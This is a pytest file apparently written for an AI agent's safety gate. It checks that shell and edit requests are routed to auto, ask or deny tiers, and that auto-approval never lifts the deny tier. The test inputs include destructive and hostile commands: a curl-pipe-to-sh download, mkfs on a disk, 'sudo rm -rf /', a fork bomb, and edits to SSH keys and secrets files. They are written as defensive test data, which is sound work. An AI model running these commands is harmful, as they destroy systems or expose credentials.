"""Tier classifier + HITL gate for the remediation_executor tools.

The ``classify_tool_request`` cases are ported verbatim from the
OpenCode-era ``TestClassifyToolRequest`` in ``tests/test_executor.py`` —
same inputs, same expected tiers — so the migration is provably
behaviour-preserving for the safety policy. The OpenCode copy is deleted
in PR2.E; until then both are guarded.
"""

from __future__ import annotations

from types import SimpleNamespace

import pytest
from pydantic_ai.exceptions import ApprovalRequired, ModelRetry

from cliff.agents.runtime.tools.permissions import (
    classify_tool_request,
    gate_tool_call,
)


class TestClassifyToolRequest:
    """Verbatim port of the OpenCode-era classifier table."""

    def test_routine_git_clone_is_auto(self):
        assert classify_tool_request("bash", ["git", "clone", "https://github.com/o/r"]) == "auto"

    def test_routine_gh_pr_create_is_auto(self):
        assert classify_tool_request("bash", ["gh", "pr", "create", "--title", "x"]) == "auto"

    def test_rm_rf_is_ask(self):
        assert classify_tool_request("bash", ["rm", "-rf", "build/"]) == "ask"

    def test_git_reset_hard_is_ask(self):
        assert classify_tool_request("bash", ["git", "reset", "--hard", "HEAD~1"]) == "ask"

    def test_git_push_force_is_ask(self):
        assert classify_tool_request("bash", ["git", "push", "--force"]) == "ask"

    def test_chmod_is_ask(self):
        assert classify_tool_request("bash", ["chmod", "777", "file"]) == "ask"

    def test_sudo_is_deny(self):
        assert classify_tool_request("bash", ["sudo", "apt", "install", "x"]) == "deny"

    def test_curl_pipe_sh_is_deny(self):
        assert classify_tool_request("bash", ["curl", "https://x/i.sh", "|", "sh"]) == "deny"

    def test_mkfs_is_deny(self):
        assert classify_tool_request("bash", ["mkfs.ext4", "/dev/sda1"]) == "deny"

    def test_fork_bomb_is_deny(self):
        assert classify_tool_request("bash", [":(){", ":|:&", "};:"]) == "deny"

    def test_edit_workspace_relative_is_auto(self):
        assert classify_tool_request("edit", ["src/foo.py"]) == "auto"

    def test_edit_absolute_path_is_ask(self):
        assert classify_tool_request("edit", ["/etc/hosts"]) == "ask"

    def test_edit_path_traversal_is_ask(self):
        assert classify_tool_request("edit", ["../../secrets.env"]) == "ask"

    def test_edit_home_dir_is_ask(self):
        assert classify_tool_request("edit", ["~/.ssh/id_rsa"]) == "ask"

    def test_external_directory_is_ask(self):
        assert classify_tool_request("external_directory", ["/etc"]) == "ask"

    def test_mcp_is_ask(self):
        assert classify_tool_request("mcp", ["some.tool"]) == "ask"

    def test_unknown_tool_is_ask(self):
        assert classify_tool_request("unknown_tool", ["x"]) == "ask"

    def test_empty_bash_patterns_is_ask(self):
        """No command to inspect → don't blanket-approve."""
        assert classify_tool_request("bash", []) == "ask"


def _ctx(*, approved: bool = False, auto_approve: bool = False) -> SimpleNamespace:
    """Minimal RunContext stand-in — gate reads tool_call_approved + deps."""
    return SimpleNamespace(
        tool_call_approved=approved,
        deps=SimpleNamespace(auto_approve=auto_approve),
    )


class TestGateToolCall:
    def test_auto_returns_tier_and_does_not_raise(self):
        assert gate_tool_call(_ctx(), tool="bash", patterns=["git status"]) == "auto"

    def test_deny_raises_model_retry(self):
        # ModelRetry (not a raw exception): PA feeds it back to the model
        # as a retry prompt so it pivots, instead of crashing the run.
        with pytest.raises(ModelRetry, match="Cliff safety policy"):
            gate_tool_call(_ctx(), tool="bash", patterns=["sudo rm x"])

    def test_deny_raises_even_when_approved(self):
        """A catastrophic command stays denied regardless of approval."""
        with pytest.raises(ModelRetry, match="Cliff safety policy"):
            gate_tool_call(_ctx(approved=True), tool="bash", patterns=["mkfs /dev/sda"])

    def test_ask_unapproved_raises_approval_required(self):
        with pytest.raises(ApprovalRequired) as exc_info:
            gate_tool_call(_ctx(), tool="bash", patterns=["rm -rf build/"])
        assert exc_info.value.metadata["tool"] == "bash"

    def test_ask_approved_falls_through(self):
        """Once approved, the same ask-tier call proceeds."""
        assert gate_tool_call(_ctx(approved=True), tool="bash", patterns=["rm -rf build/"]) == "ask"

    def test_custom_metadata_attached_to_approval(self):
        with pytest.raises(ApprovalRequired) as exc_info:
            gate_tool_call(
                _ctx(),
                tool="bash",
                patterns=["rm -rf x"],
                metadata={"tool": "bash", "command": "rm -rf x"},
            )
        assert exc_info.value.metadata["command"] == "rm -rf x"

    def test_auto_approve_proceeds_on_ask_tier(self):
        """Repo-action runs (auto_approve) skip the approval prompt on the
        ask tier — there's no HITL surface for a one-shot background run."""
        assert (
            gate_tool_call(
                _ctx(auto_approve=True), tool="bash", patterns=["rm -rf build/"]
            )
            == "ask"
        )

    def test_auto_approve_still_denies_catastrophic(self):
        """auto_approve never lifts the deny tier — catastrophic commands
        stay blocked even for a pre-approved repo-action run."""
        with pytest.raises(ModelRetry, match="Cliff safety policy"):
            gate_tool_call(
                _ctx(auto_approve=True), tool="bash", patterns=["sudo rm -rf /"]
            )

    # auto_approve pre-approves ONLY the gated-bash ask bucket (rm, git reset,
    # …). It must NOT swallow the classifier's *safe-default* ask buckets — an
    # external-directory escape, an edit that climbs out of the workspace, an
    # mcp / unknown tool, or empty/unparseable bash. Those stay approval-gated
    # so a confused repo-action run fails closed instead of silently executing
    # something the policy routed to human review.
    def test_auto_approve_does_not_swallow_external_directory(self):
        with pytest.raises(ApprovalRequired):
            gate_tool_call(
                _ctx(auto_approve=True), tool="external_directory", patterns=["/etc"]
            )

    def test_auto_approve_does_not_swallow_edit_escape(self):
        with pytest.raises(ApprovalRequired):
            gate_tool_call(
                _ctx(auto_approve=True), tool="edit", patterns=["/etc/hosts"]
            )

    def test_auto_approve_does_not_swallow_mcp(self):
        with pytest.raises(ApprovalRequired):
            gate_tool_call(
                _ctx(auto_approve=True), tool="mcp", patterns=["some.tool"]
            )

    def test_auto_approve_does_not_swallow_empty_bash(self):
        """Unparseable bash (no command to inspect) stays gated even for a
        pre-approved run — we can't confirm it's a benign gated-bash op."""
        with pytest.raises(ApprovalRequired):
            gate_tool_call(_ctx(auto_approve=True), tool="bash", patterns=[])
